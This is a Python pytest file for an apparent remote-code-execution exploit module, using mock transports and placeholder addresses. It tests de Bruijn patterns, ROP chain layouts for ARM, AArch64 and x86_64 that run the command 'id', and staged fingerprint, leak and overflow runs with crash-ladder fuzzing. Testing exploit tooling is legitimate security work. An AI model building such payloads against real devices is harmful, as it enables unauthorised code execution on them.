import pytest

from brunel.rce import RCE, RCEConfig, aarch64_rop, arm_rop, de_bruijn, x86_64_rop
from brunel.mock import MockTransport


def test_de_bruijn_windows_are_unique():
    pattern = de_bruijn(512)
    assert len(pattern) == 512
    assert len({pattern[i : i + 4] for i in range(len(pattern) - 3)}) == 509


def test_arm_chain_layout():
    value = arm_rop(0x11111111, 0x22222222, "id", offset=256)
    assert len(value) == 512
    assert value[256:268] == bytes.fromhex("232222220c01000011111111")
    assert value[268:270] == b"id"


def test_arm_chain_layout_three_register_gadget():
    value = arm_rop(0x11111111, 0x22222222, "id", offset=256, gadget_words=3)
    assert value[256:272] == bytes.fromhex(
        "2322222210010000""00000000""11111111"
    )
    assert value[272:274] == b"id"


def test_aarch64_chain_layout():
    value = aarch64_rop(0x1111111111111111, 0x2222222222222222, "id", offset=256)
    assert value[256:280] == bytes.fromhex(
        "2222222222222222" + "1801000000000000" + "1111111111111111"
    )
    assert value[280:282] == b"id"


def test_x86_64_chain_layout():
    value = x86_64_rop(0x1111111111111111, 0x2222222222222222, "id", offset=256)
    assert value[256:280] == bytes.fromhex(
        "2222222222222222" + "1801000000000000" + "1111111111111111"
    )
    assert value[280:282] == b"id"


@pytest.mark.asyncio
async def test_mock_rce_stages():
    transport = MockTransport()
    exploit = RCE(
        transport,
        RCEConfig(scan_seconds=1.0, settle=0.2, recovery=5.0, dry_run=True),
    )
    results = await exploit.run()
    assert [result.stage for result in results] == ["fingerprint", "leak", "action"]
    assert results[1].status == "crash"
    assert results[2].status == "ok"


@pytest.mark.asyncio
async def test_mock_action_write_command_delivers_512_bytes():
    transport = MockTransport()
    transport.bus.crash_on_eir = False
    transport.bus.crash_on_action_fuzz = False
    config = RCEConfig(
        address=transport.bus.address,
        system=0x11111111,
        gadget=0x22222222,
        write_mode="command",
        settle=0.3,
        recovery=0.5,
    )
    exploit = RCE(transport, config)
    await exploit.scan()
    await exploit.discover()
    result = await exploit._action_once(3, 256)
    expected = exploit.build_action_value(256)
    assert result.status == "ok"
    assert transport.bus.action_log[-1] == expected
    assert len(transport.bus.action_log[-1]) == 512


@pytest.mark.asyncio
async def test_mock_action_prepare_delivers_512_bytes():
    transport = MockTransport()
    transport.bus.crash_on_eir = False
    transport.bus.crash_on_action_fuzz = False
    config = RCEConfig(
        address=transport.bus.address,
        system=0x11111111,
        gadget=0x22222222,
        write_mode="prepare",
        settle=0.3,
        recovery=0.5,
    )
    exploit = RCE(transport, config)
    await exploit.scan()
    await exploit.discover()
    result = await exploit._action_once(3, 256)
    expected = exploit.build_action_value(256)
    assert result.status == "ok"
    assert transport.bus.action_log[-1] == expected


@pytest.mark.asyncio
async def test_mock_ladder_stops_at_first_crash():
    transport = MockTransport()
    transport.bus.crash_on_eir = False
    transport.bus.crash_on_action_fuzz = True
    config = RCEConfig(
        address=transport.bus.address,
        write_mode="command",
        ladder_lengths="1,4,8,64",
        settle=0.3,
        recovery=0.5,
    )
    exploit = RCE(transport, config)
    await exploit.scan()
    await exploit.discover()
    result = await exploit.ladder(3)
    assert result is not None
    assert result.status == "crash"
    assert result.evidence["length"] == 8


def test_x86_64_alignment_gadget_layout():
    value = x86_64_rop(0x1111111111111111, 0x2222222222222222, "id", offset=256, align_ret=0x3333333333333333)
    assert value[256:288] == bytes.fromhex(
        "2222222222222222" + "2001000000000000" + "3333333333333333" + "1111111111111111"
    )
    assert value[288:290] == b"id"


def test_aarch64_alignment_gadget_layout():
    value = aarch64_rop(0x1111111111111111, 0x2222222222222222, "id", offset=256, align_ret=0x3333333333333333)
    assert value[256:288] == bytes.fromhex(
        "2222222222222222" + "2001000000000000" + "3333333333333333" + "1111111111111111"
    )
    assert value[288:290] == b"id"
